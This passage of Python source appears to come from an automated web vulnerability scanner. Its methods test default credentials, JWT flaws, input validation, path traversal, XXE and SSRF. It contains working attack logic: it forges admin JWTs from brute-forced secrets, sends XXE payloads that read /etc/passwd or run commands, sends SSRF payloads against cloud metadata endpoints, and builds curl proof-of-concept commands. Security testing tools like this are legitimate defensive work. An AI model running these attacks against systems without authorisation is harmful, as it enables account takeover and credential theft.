            len(DEFAULT_CREDENTIALS), login_url,
        )

        found_vuln = False

        for username, password in DEFAULT_CREDENTIALS:
            if self._cancelled:
                break
            if found_vuln and not self.aggressive:
                break

            # Build login request body
            login_bodies = [
                {"email": username, "password": password},
                {"username": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "password": password},
            ]

            for login_body in login_bodies:
                if self._cancelled:
                    break

                resp = await self._send_raw_request(
                    method="POST",
                    url=login_url,
                    json_data=login_body,
                )
                self._update_progress(category, login_url)

                if not resp:
                    continue

                # Check if login succeeded
                login_success = False
                evidence = ""

                if resp.status_code == 200:
                    # Check for token in response
                    jwt = resp.extract_jwt_from_response()
                    if jwt:
                        login_success = True
                        evidence = (
                            f"Default credentials work: {username}:{password} "
                            f"— JWT token received"
                        )
                        # Store the credential
                        self.state.add_credential({
                            "username": username,
                            "password": password,
                            "source": "default_creds_scan",
                            "token": jwt,
                        })

                    # Check for success indicators in response
                    if resp.is_json and resp.json_data:
                        data = resp.json_data
                        if isinstance(data, dict):
                            has_auth = any(
                                k.lower() in ("token", "access_token", "accesstoken", "auth", "authentication", "jwt")
                                for k in data.keys()
                            )
                            if has_auth:
                                login_success = True
                                evidence = (
                                    f"Default credentials work: {username}:{password} "
                                    f"— auth token in response"
                                )

                    body_lower = resp.text.lower() if resp.text else ""
                    if any(kw in body_lower for kw in ["welcome", "dashboard", "logged in", "success"]):
                        if not any(kw in body_lower for kw in ["invalid", "incorrect", "failed", "error"]):
                            login_success = True
                            if not evidence:
                                evidence = (
                                    f"Default credentials work: {username}:{password} "
                                    f"— success indicators in response"
                                )

                if login_success:
                    result = TestResult(
                        target=ScanTarget(url=login_url, method="POST"),
                        category=category,
                        payload=f"{username}:{password}",
                        parameter="credentials",
                        request_url=login_url,
                        request_method="POST",
                        request_body=login_body,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{json.dumps(login_body)}'"
                    )
                    result.poc += f"\n\n# Default credentials: {username}:{password}"

                    results.append(result)
                    self._record_finding(result)
                    self._all_results.append(result)
                    found_vuln = True
                    break  # Found working creds with this body format

            if found_vuln and not self.aggressive:
                break

        self._mark_category_complete(category)
        self.state.mark_endpoint_tested(login_url, category.value, {
            "credentials_tested": len(DEFAULT_CREDENTIALS),
            "vulnerable": found_vuln,
        })

        return results

    # =================================================================
    # JWT ATTACK SCANNER
    # =================================================================

    async def _scan_jwt_attacks(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for JWT-specific vulnerabilities:
        1. Algorithm none attack.
        2. Weak secret brute force.
        3. Algorithm confusion (RS256 → HS256).
        4. Token tampering.
        """
        results: List[TestResult] = []
        category = ScanCategory.JWT_ATTACK

        if not self._auth_token:
            return results

        # Verify it's a JWT
        if not self._looks_like_jwt(self._auth_token):
            return results

        if self._is_tested(target.url, category):
            return results

        found_vuln = False

        # === Strategy 1: Algorithm None attack ===
        none_result = await self._test_jwt_none_alg(target)
        if none_result and none_result.is_vulnerable:
            results.append(none_result)
            self._record_finding(none_result)
            found_vuln = True

        # === Strategy 2: Weak secret brute force ===
        if not found_vuln or self.aggressive:
            secret_result = await self._test_jwt_weak_secret(target)
            if secret_result and secret_result.is_vulnerable:
                results.append(secret_result)
                self._record_finding(secret_result)
                found_vuln = True

        # === Strategy 3: Token tampering ===
        if not found_vuln or self.aggressive:
            tamper_result = await self._test_jwt_tampering(target)
            if tamper_result and tamper_result.is_vulnerable:
                results.append(tamper_result)
                self._record_finding(tamper_result)
                found_vuln = True

        self.state.mark_endpoint_tested(target.url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    def _looks_like_jwt(self, token: str) -> bool:
        """Check if a string looks like a JWT token."""
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            import base64
            # Try to decode header
            header_padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header_json = base64.urlsafe_b64decode(header_padded)
            header = json.loads(header_json)
            return "alg" in header or "typ" in header
        except Exception:
            return False

    def _decode_jwt_parts(self, token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT header and payload (without verification)."""
        import base64
        parts = token.split(".")
        header_padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
        payload_padded = parts[1] + "=" * (4 - len(parts[1]) % 4)

        header = json.loads(base64.urlsafe_b64decode(header_padded))
        payload = json.loads(base64.urlsafe_b64decode(payload_padded))
        signature = parts[2]

        return header, payload, signature

    def _encode_jwt_part(self, data: Dict) -> str:
        """Base64url encode a JWT part."""
        import base64
        json_bytes = json.dumps(data, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(json_bytes).rstrip(b"=").decode("utf-8")

    async def _test_jwt_none_alg(self, target: ScanTarget) -> Optional[TestResult]:
        """
        JWT algorithm 'none' attack.
        Change algorithm to none/None/NONE and remove signature.
        """
        try:
            header, payload, _ = self._decode_jwt_parts(self._auth_token)
        except Exception:
            return None

        none_variants = ["none", "None", "NONE", "nOnE"]

        for none_alg in none_variants:
            if self._cancelled:
                break

            # Build tampered token
            tampered_header = dict(header)
            tampered_header["alg"] = none_alg

            tampered_token = (
                self._encode_jwt_part(tampered_header)
                + "."
                + self._encode_jwt_part(payload)
                + "."
            )

            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=target.body,
                headers={"Authorization": f"Bearer {tampered_token}"},
            )
            self._update_progress(ScanCategory.JWT_ATTACK, target.url)

            if not resp:
                continue

            if resp.status_code == 200 and resp.content_length > 50:
                body_lower = resp.text.lower() if resp.text else ""
                not_error = all(
                    kw not in body_lower
                    for kw in ["invalid", "expired", "unauthorized", "error", "denied"]
                )

                if not_error:
                    evidence = (
                        f"JWT algorithm 'none' attack successful: "
                        f"token with alg={none_alg} and empty signature accepted. "
                        f"Server returned HTTP {resp.status_code}"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.JWT_ATTACK,
                        payload=tampered_token[:80] + "...",
                        parameter="jwt_algorithm",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Authorization: Bearer {tampered_token}'"
                    )
                    result.poc += f"\n\n# JWT 'none' algorithm attack"
                    result.poc += f"\n# Tampered header: {json.dumps(tampered_header)}"
                    result.poc += f"\n# Payload: {json.dumps(payload)}"
                    result.poc += f"\n# Signature: (empty)"

                    self._all_results.append(result)
                    return result

        return None

    async def _test_jwt_weak_secret(self, target: ScanTarget) -> Optional[TestResult]:
        """
        Try to crack JWT secret using common passwords.
        """
        try:
            import hmac
            import hashlib
            import base64
        except ImportError:
            return None

        try:
            header, payload, original_sig = self._decode_jwt_parts(self._auth_token)
        except Exception:
            return None

        if header.get("alg", "").upper() not in ("HS256", "HS384", "HS512"):
            return None

        alg = header.get("alg", "HS256")
        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg.upper(), hashlib.sha256)

        secrets_to_try = self.payloads.get_jwt_secrets()

        # Add some additional common secrets
        extra_secrets = [
            "secret", "password", "12345", "123456",
            "qwerty", "admin", "key", "private",
            "jwt_secret", "your-256-bit-secret",
            "super_secret", "changeme", "letmein",
        ]
        all_secrets = list(set(secrets_to_try + extra_secrets))

        token_parts = self._auth_token.split(".")
        signing_input = f"{token_parts[0]}.{token_parts[1]}".encode("utf-8")

        for secret in all_secrets:
            if self._cancelled:
                break

            try:
                sig = hmac.new(
                    secret.encode("utf-8"),
                    signing_input,
                    hash_func,
                ).digest()
                computed_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode("utf-8")

                if computed_sig == original_sig:
                    # Found the secret!
                    self.state.set_jwt_secret(secret)

                    evidence = (
                        f"JWT weak secret found: '{secret}' "
                        f"(algorithm: {alg}). Token can be forged."
                    )

                    # Create a tampered token with admin privileges
                    tampered_payload = dict(payload)
                    tampered_payload["role"] = "admin"
                    if "isAdmin" in str(payload):
                        tampered_payload["isAdmin"] = True

                    new_payload_encoded = self._encode_jwt_part(tampered_payload)
                    new_signing_input = f"{token_parts[0]}.{new_payload_encoded}".encode("utf-8")
                    new_sig = hmac.new(
                        secret.encode("utf-8"),
                        new_signing_input,
                        hash_func,
                    ).digest()
                    new_sig_encoded = base64.urlsafe_b64encode(new_sig).rstrip(b"=").decode("utf-8")
                    forged_token = f"{token_parts[0]}.{new_payload_encoded}.{new_sig_encoded}"

                    result = TestResult(
                        target=target,
                        category=ScanCategory.JWT_ATTACK,
                        payload=f"secret:{secret}",
                        parameter="jwt_secret",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=0,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"# JWT Secret: {secret}\n"
                        f"# Algorithm: {alg}\n"
                        f"# Original payload: {json.dumps(payload)}\n"
                        f"# Forged token with admin role:\n"
                        f"# {forged_token}\n\n"
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Authorization: Bearer {forged_token}'"
                    )

                    self._all_results.append(result)
                    return result

            except Exception:
                continue

            self._update_progress(ScanCategory.JWT_ATTACK, target.url)

        return None

    async def _test_jwt_tampering(self, target: ScanTarget) -> Optional[TestResult]:
        """
        Try modifying JWT payload fields and re-signing
        with known or discovered secrets.
        """
        try:
            header, payload, _ = self._decode_jwt_parts(self._auth_token)
        except Exception:
            return None

        known_secret = self.state.get_jwt_secret()
        if not known_secret:
            return None

        alg = header.get("alg", "HS256")
        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg.upper())

        if not hash_func:
            return None

        import hmac
        import base64

        # Tampering payloads
        tamper_mods = [
            {"role": "admin"},
            {"isAdmin": True},
            {"role": "admin", "isAdmin": True},
        ]

        # If payload has user ID, try changing it
        for key in ("sub", "id", "userId", "user_id", "uid"):
            if key in payload:
                original_val = payload[key]
                if isinstance(original_val, int):
                    tamper_mods.append({key: 1})
                elif isinstance(original_val, str) and original_val.isdigit():
                    tamper_mods.append({key: "1"})

        for mods in tamper_mods:
            if self._cancelled:
                break

            tampered_payload = dict(payload)
            tampered_payload.update(mods)

            header_encoded = self._encode_jwt_part(header)
            payload_encoded = self._encode_jwt_part(tampered_payload)
            signing_input = f"{header_encoded}.{payload_encoded}".encode("utf-8")

            sig = hmac.new(
                known_secret.encode("utf-8"),
                signing_input,
                hash_func,
            ).digest()
            sig_encoded = base64.urlsafe_b64encode(sig).rstrip(b"=").decode("utf-8")
            forged_token = f"{header_encoded}.{payload_encoded}.{sig_encoded}"

            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=target.body,
                headers={"Authorization": f"Bearer {forged_token}"},
            )
            self._update_progress(ScanCategory.JWT_ATTACK, target.url)

            if not resp:
                continue

            if resp.status_code == 200 and resp.content_length > 50:
                body_lower = resp.text.lower() if resp.text else ""
                not_error = all(
                    kw not in body_lower
                    for kw in ["invalid", "unauthorized", "forbidden", "error"]
                )

                if not_error:
                    mods_str = json.dumps(mods)
                    evidence = (
                        f"JWT tampering accepted: modified {mods_str} in payload, "
                        f"re-signed with known secret '{known_secret}'. "
                        f"Server returned HTTP {resp.status_code}"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.JWT_ATTACK,
                        payload=mods_str,
                        parameter="jwt_payload",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Authorization: Bearer {forged_token}'"
                    )
                    result.poc += f"\n\n# JWT Tampering: modified payload with {mods_str}"
                    result.poc += f"\n# Secret: {known_secret}"
                    result.poc += f"\n# Forged token: {forged_token}"

                    self._all_results.append(result)
                    return result

        return None

    # =================================================================
    # INPUT VALIDATION SCANNER
    # =================================================================

    async def _scan_input_validation(self, target: ScanTarget) -> List[TestResult]:
        """
        Test input validation by sending:
        1. Boundary values (negative, zero, MAX_INT).
        2. Type confusion (string where int expected).
        3. Empty values.
        4. Special characters.
        5. Oversized inputs.
        """
        results: List[TestResult] = []
        category = ScanCategory.INPUT_VALIDATION
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            found_vuln = False

            # Build validation test payloads
            validation_payloads = self._build_validation_payloads(param_name, param_value)

            logger.info(
                "Input Validation: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(validation_payloads),
            )

            for payload_name, payload_value in validation_payloads:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                resp = await self._send_payload(
                    target, param_name, param_location,
                    str(payload_value), param_value,
                )
                self._update_progress(category, target.url)

                if not resp:
                    continue

                # Check for interesting responses
                is_vuln, confidence, evidence = self._check_input_validation(
                    resp, baseline, payload_name, str(payload_value),
                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=category,
                        payload=f"{payload_name}: {payload_value}",
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.MEDIUM,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, category, param_name,
                        param_location, str(payload_value), resp,
                    )
                    result.poc += f"\n\n# Input validation issue: {payload_name}"

                    results.append(result)
                    self._record_finding(result)
                    self._all_results.append(result)
                    found_vuln = True

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "vulnerable": found_vuln,
            })

        return results

    def _build_validation_payloads(
        self,
        param_name: str,
        param_value: str,
    ) -> List[Tuple[str, Any]]:
        """
        Build input validation test payloads based on
        the parameter name and current value.
        """
        payloads: List[Tuple[str, Any]] = []

        # Boundary values
        payloads.extend([
            ("negative_number", -1),
            ("negative_large", -99999),
            ("zero", 0),
            ("max_int", 2147483647),
            ("max_int_plus_one", 2147483648),
            ("max_long", 9999999999999999),
            ("float_value", 1.5),
            ("scientific_notation", "1e10"),
            ("infinity", "Infinity"),
            ("negative_infinity", "-Infinity"),
            ("nan", "NaN"),
        ])

        # Type confusion
        payloads.extend([
            ("string_for_int", "abc"),
            ("boolean_true", True),
            ("boolean_false", False),
            ("null_value", None),
            ("null_string", "null"),
            ("undefined_string", "undefined"),
            ("array_value", [1, 2, 3]),
            ("object_value", {"key": "value"}),
            ("nested_object", {"__proto__": {"admin": True}}),
        ])

        # Empty / blank values
        payloads.extend([
            ("empty_string", ""),
            ("space_only", " "),
            ("tab_only", "\t"),
            ("newline_only", "\n"),
            ("null_byte", "\x00"),
            ("null_byte_string", "%00"),
        ])

        # Special characters
        payloads.extend([
            ("special_chars", "!@#$%^&*()"),
            ("unicode_chars", "日本語テスト"),
            ("emoji", "😀🎉💀"),
            ("rtl_override", "\u202etest"),
            ("zero_width_space", "test\u200btest"),
            ("backslash_n", "test\\ntest"),
            ("crlf_injection", "test\r\nX-Injected: true"),
        ])

        # Oversized inputs
        payloads.extend([
            ("long_string_1k", "A" * 1000),
            ("long_string_10k", "A" * 10000),
            ("repeated_special", "<>" * 500),
        ])

        # If parameter looks numeric, add more numeric tests
        if param_value.isdigit() or param_name.lower() in (
            "id", "quantity", "amount", "price", "count", "num", "number",
            "page", "limit", "offset", "size",
        ):
            payloads.extend([
                ("negative_price", -100),
                ("zero_quantity", 0),
                ("huge_quantity", 999999999),
                ("decimal_quantity", 0.1),
                ("negative_decimal", -0.01),
            ])

        return payloads

    def _check_input_validation(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload_name: str,
        payload_value: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Check response for input validation issues.
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        # 1. Server error on malformed input
        if response.status_code == 500:
            evidence_parts.append(
                f"Server error (500) on {payload_name} input: '{payload_value[:50]}'"
            )
            is_vuln = True
            confidence = Confidence.HIGH

        # 2. Negative values accepted for prices/quantities
        if "negative" in payload_name.lower() and response.status_code in (200, 201):
            if response.is_json and response.json_data:
                data_str = json.dumps(response.json_data).lower()
                if any(kw in data_str for kw in ["success", "created", "updated", "total"]):
                    evidence_parts.append(
                        f"Negative value accepted: {payload_name}={payload_value}"
                    )
                    is_vuln = True
                    confidence = Confidence.HIGH

        # 3. Stack trace / debug info exposed
        body_lower = response.text.lower() if response.text else ""
        if any(kw in body_lower for kw in [
            "stack trace", "traceback", "exception",
            "at line", "syntax error", "type error",
            "reference error", "null pointer",
        ]):
            evidence_parts.append(
                f"Debug/error information exposed on {payload_name} input"
            )
            is_vuln = True
            confidence = Confidence.CONFIRMED

        # 4. Type confusion accepted
        if "confusion" in payload_name or "object" in payload_name or "array" in payload_name:
            if response.status_code in (200, 201):
                evidence_parts.append(
                    f"Type confusion accepted: sent {payload_name} where different type expected"
                )
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.MEDIUM

        # 5. CRLF injection
        if "crlf" in payload_name.lower():
            if response.headers:
                for h_name, h_value in response.headers.items():
                    if "x-injected" in h_name.lower() or "x-injected" in h_value.lower():
                        evidence_parts.append("CRLF injection: custom header injected")
                        is_vuln = True
                        confidence = Confidence.CONFIRMED
                        break

        # 6. Null byte issues
        if "null" in payload_name.lower() and response.status_code == 500:
            evidence_parts.append(f"Server error on null byte/null value: {payload_name}")
            if not is_vuln:
                is_vuln = True
                confidence = Confidence.MEDIUM

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    # =================================================================
    # PATH TRAVERSAL SCANNER
    # =================================================================

    async def _scan_path_traversal(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for path traversal / local file inclusion.
        """
        results: List[TestResult] = []
        category = ScanCategory.PATH_TRAVERSAL
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            # Only test params that might accept file paths
            path_param_indicators = [
                "file", "path", "dir", "directory", "page",
                "url", "uri", "doc", "document", "template",
                "include", "require", "load", "read",
                "source", "src", "img", "image", "download",
                "view", "content", "folder", "name",
            ]
            is_path_param = any(
                ind in param_name.lower() for ind in path_param_indicators
            )
            # Also test if the value looks like a path
            is_path_value = (
                "/" in param_value
                or "\\" in param_value
                or "." in param_value
                or param_value.endswith((".html", ".php", ".jsp", ".txt", ".log", ".xml", ".json"))
            )

            if not is_path_param and not is_path_value and not self.aggressive:
                continue

            context = self._build_payload_context(target, param_name)
            payloads_raw = self.payloads.get_payloads("path_traversal", context)
            payloads_to_test = payloads_raw[:self.max_payloads]

            logger.info(
                "Path Traversal: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(payloads_to_test),
            )

            found_vuln = False

            for payload_dict in payloads_to_test:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
                if not payload_str:
                    continue

                resp = await self._send_payload(
                    target, param_name, param_location,
                    payload_str, param_value,
                )
                self._update_progress(category, target.url)

                if not resp:
                    continue

                # Check for path traversal indicators
                is_vuln, confidence, evidence = self._check_path_traversal(
                    resp, baseline, payload_str,
                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=category,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, category, param_name,
                        param_location, payload_str, resp,
                    )
                    result.poc += f"\n\n# Path Traversal: read system files via {param_name}"

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name,
                            payload_str, resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text

                    results.append(result)
                    self._record_finding(result)
                    self._all_results.append(result)
                    found_vuln = True

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "vulnerable": found_vuln,
            })

        return results

    def _check_path_traversal(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Check response for path traversal indicators.
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        body = response.text if response.text else ""

        for indicator in PATH_TRAVERSAL_INDICATORS:
            if indicator.lower() in body.lower():
                if not baseline.captured or indicator.lower() not in (baseline.body_preview or "").lower():
                    evidence_parts.append(f"File content indicator: '{indicator}'")
                    is_vuln = True
                    confidence = Confidence.CONFIRMED
                    break

        # Check for /etc/passwd format
        if re.search(r"[a-zA-Z0-9_-]+:[x*!]:\d+:\d+:", body):
            if not baseline.captured or not re.search(
                r"[a-zA-Z0-9_-]+:[x*!]:\d+:\d+:", baseline.body_preview or "",
            ):
                evidence_parts.append("Unix /etc/passwd content detected")
                is_vuln = True
                confidence = Confidence.CONFIRMED

        # Check for Windows file content
        if "[boot loader]" in body or "[operating systems]" in body:
            evidence_parts.append("Windows boot.ini content detected")
            is_vuln = True
            confidence = Confidence.CONFIRMED

        # Response significantly different from baseline
        if baseline.captured and not is_vuln:
            if (
                response.status_code == 200
                and baseline.status_code == 200
                and response.content_length > baseline.content_length * 2
            ):
                evidence_parts.append(
                    f"Response size anomaly: {baseline.content_length} → {response.content_length}"
                )
                is_vuln = True
                confidence = Confidence.MEDIUM

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    # =================================================================
    # XXE SCANNER
    # =================================================================

    async def _scan_xxe(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for XML External Entity injection.
        Only applicable when endpoint accepts XML input.
        """
        results: List[TestResult] = []
        category = ScanCategory.XXE

        if self._is_tested(target.url, category):
            return results

        # Check if endpoint accepts XML
        accepts_xml = (
            "xml" in (target.content_type or "").lower()
            or target.method in ("POST", "PUT", "PATCH")
        )

        if not accepts_xml and not self.aggressive:
            return results

        context = self._build_payload_context(target, "xml_body")
        payloads_raw = self.payloads.get_payloads("xxe", context)
        payloads_to_test = payloads_raw[:self.max_payloads]

        if not payloads_to_test:
            # Manual XXE payloads
            payloads_to_test = [
                {"payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'},
                {"payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'},
                {"payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><root>&xxe;</root>'},
                {"payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'},
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'},
            ]

        logger.info(
            "XXE: Testing %s with %d payloads",
            target.url, len(payloads_to_test),
        )

        baseline = self._get_baseline(target)
        found_vuln = False

        for payload_dict in payloads_to_test:
            if self._cancelled:
                break
            if found_vuln and not self.aggressive:
                break

            payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
            if not payload_str:
                continue

            resp = await self._send_raw_request(
                method=target.method if target.method in ("POST", "PUT", "PATCH") else "POST",
                url=target.url,
                data=payload_str,
                headers={
                    "Content-Type": "application/xml",
                    "Accept": "application/xml, text/xml, */*",
                },
            )
            self._update_progress(category, target.url)

            if not resp:
                continue

            # Check for XXE indicators
            is_vuln = False
            evidence = ""
            body = resp.text if resp.text else ""

            # Check for /etc/passwd content
            if re.search(r"root:[x*!]:\d+:\d+:", body):
                is_vuln = True
                evidence = "XXE: /etc/passwd content in response"
                confidence = Confidence.CONFIRMED

            # Check for Windows file content
            elif "[boot loader]" in body or "for 16-bit app support" in body.lower():
                is_vuln = True
                evidence = "XXE: Windows system file content in response"
                confidence = Confidence.CONFIRMED

            # Check for hostname/other file content
            elif resp.status_code == 200 and resp.content_length > 0:
                if baseline.captured and resp.content_length > baseline.content_length * 1.5:
                    is_vuln = True
                    evidence = f"XXE: Response size anomaly ({baseline.content_length} → {resp.content_length})"
                    confidence = Confidence.MEDIUM
                else:
                    confidence = Confidence.TENTATIVE

            # Check for XML parsing errors (partial XXE)
            xml_errors = ["xml parsing error", "xmlparser", "entity", "dtd", "doctype"]
            if any(err in body.lower() for err in xml_errors):
                if not is_vuln:
                    is_vuln = True
                    evidence = "XXE: XML parser error indicates DTD processing is enabled"
                    confidence = Confidence.MEDIUM

            if is_vuln:
                result = TestResult(
                    target=target,
                    category=category,
                    payload=payload_str[:200],
                    parameter="xml_body",
                    request_url=target.url,
                    request_method=target.method,
                    response_status=resp.status_code,
                    response_body=body[:2000],
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                    is_vulnerable=True,
                    confidence=confidence,
                    severity=Severity.CRITICAL,
                    evidence=evidence,
                )
                result.poc = (
                    f"curl -X POST '{target.url}' "
                    f"-H 'Content-Type: application/xml' "
                )
                if self._auth_token:
                    result.poc += f"-H 'Authorization: Bearer {self._auth_token}' "
                result.poc += f"-d '{payload_str}'"

                results.append(result)
                self._record_finding(result)
                self._all_results.append(result)
                found_vuln = True

        self.state.mark_endpoint_tested(target.url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    # =================================================================
    # SSRF SCANNER
    # =================================================================

    async def _scan_ssrf(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for Server-Side Request Forgery.
        """
        results: List[TestResult] = []
        category = ScanCategory.SSRF
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        # SSRF-relevant parameter names
        ssrf_param_indicators = [
            "url", "uri", "link", "href", "src", "source",
            "redirect", "return", "next", "target", "dest",
            "destination", "rurl", "domain", "host", "site",
            "feed", "callback", "path", "continue", "window",
            "go", "image_url", "img_url", "load_url",
            "request", "proxy", "fetch",
        ]

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            # Check if parameter is likely URL-related
            is_url_param = any(
                ind in param_name.lower() for ind in ssrf_param_indicators
            )
            is_url_value = (
                param_value.startswith(("http://", "https://", "//", "ftp://"))
                or "://" in param_value
            )

            if not is_url_param and not is_url_value and not self.aggressive:
                continue

            context = self._build_payload_context(target, param_name)
            payloads_raw = self.payloads.get_payloads("ssrf", context)
            payloads_to_test = payloads_raw[:self.max_payloads]

            if not payloads_to_test:
                # Manual SSRF payloads
                payloads_to_test = [
                    {"payload": "http://127.0.0.1"},
                    {"payload": "http://localhost"},
                    {"payload": "http://127.0.0.1:22"},
                    {"payload": "http://127.0.0.1:3306"},
                    {"payload": "http://127.0.0.1:6379"},
                    {"payload": "http://[::1]"},
                    {"payload": "http://0.0.0.0"},
                    {"payload": "http://169.254.169.254/latest/meta-data/"},
                    {"payload": "http://metadata.google.internal/"},
                    {"payload": "file:///etc/passwd"},
                    {"payload": "file:///etc/hostname"},
                    {"payload": "dict://127.0.0.1:6379/info"},
                    {"payload": "gopher://127.0.0.1:25/"},
                ]

            logger.info(
                "SSRF: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(payloads_to_test),
            )

            found_vuln = False

            for payload_dict in payloads_to_test:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
                if not payload_str:
                    continue

                resp = await self._send_payload(
                    target, param_name, param_location,
                    payload_str, param_value,
                )
                self._update_progress(category, target.url)

                if not resp:
                    continue

                # Check for SSRF indicators
                is_vuln = False
                evidence = ""
                confidence = Confidence.TENTATIVE
                body = resp.text if resp.text else ""
                body_lower = body.lower()

                # Check for internal service responses
                if "127.0.0.1" in payload_str or "localhost" in payload_str:
                    # Different response from baseline suggests internal fetch worked
                    if baseline.captured:
                        resp_hash = hashlib.md5(body.encode("utf-8", errors="replace")).hexdigest()
                        if resp_hash != baseline.body_hash and resp.content_length > 50:
                            is_vuln = True
                            evidence = f"SSRF: Different response when fetching {payload_str}"
                            confidence = Confidence.MEDIUM

                # Check for cloud metadata
                if "169.254.169.254" in payload_str or "metadata" in payload_str:
                    metadata_indicators = [
                        "ami-id", "instance-id", "iam",
